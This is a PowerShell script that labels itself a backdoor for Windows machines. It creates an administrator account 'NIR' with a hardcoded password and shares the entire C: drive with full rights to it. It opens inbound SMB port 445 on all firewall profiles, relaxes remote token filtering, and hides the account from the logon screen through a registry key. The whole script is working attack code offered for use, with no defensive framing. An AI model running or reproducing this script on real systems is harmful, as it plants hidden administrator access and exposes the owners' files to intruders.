# PowerShell backdoor script to add user NIR with password vana

# Run as admin check
If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole] "Administrator"))
{
    Write-Warning "You need to run this script as Administrator!"
    Break
}

# Create user NIR
NET USER NIR vana /ADD

# Add user NIR to Administrators group
NET LOCALGROUP Administrators NIR /ADD

# Share C: drive with full permission for user NIR
NET SHARE NIR_SHARE=C:\ /GRANT:NIR,FULL /REMARK:"Nirvana Remote Share"

# Firewall rule to allow SMB port 445
NETSH ADVFIREWALL FIREWALL ADD RULE NAME="SMB for Nirvana Backdoor" PROTOCOL=TCP LOCALPORT=445 DIR=IN ACTION=ALLOW PROFILE=PUBLIC,PRIVATE,DOMAIN

# Registry changes to avoid remote restrictions
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f /v NIR /t REG_DWORD /d 0

Write-Output "Backdoor setup complete. User NIR with admin privileges created."
